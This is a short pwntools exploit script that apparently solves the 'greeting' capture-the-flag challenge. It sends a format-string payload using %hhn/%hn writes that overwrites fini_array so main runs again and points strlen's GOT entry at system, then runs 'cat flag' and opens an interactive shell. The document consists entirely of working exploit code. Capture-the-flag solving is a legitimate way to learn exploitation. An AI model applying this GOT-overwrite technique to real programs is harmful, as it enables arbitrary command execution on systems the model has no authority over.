
from pwn import *


r = process("./greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c")
#r = remote("pwn2.chal.ctf.westerns.tokyo", 16317)
r.recvuntil("your name...")
# offset to our addresses = 12+
# overwriting fini_array to run main again on exit
# overwriting strlen.got with system.plt
r.sendline("AA"+p32(0x08049934)+p32(0x8049a54+2)+p32(0x8049a54)+"%223x%12$hhn"+"%1797x%13$hn"+"%31890x%14$hn")
r.recvuntil("your name...")
r.sendline("cat flag")
r.interactive()


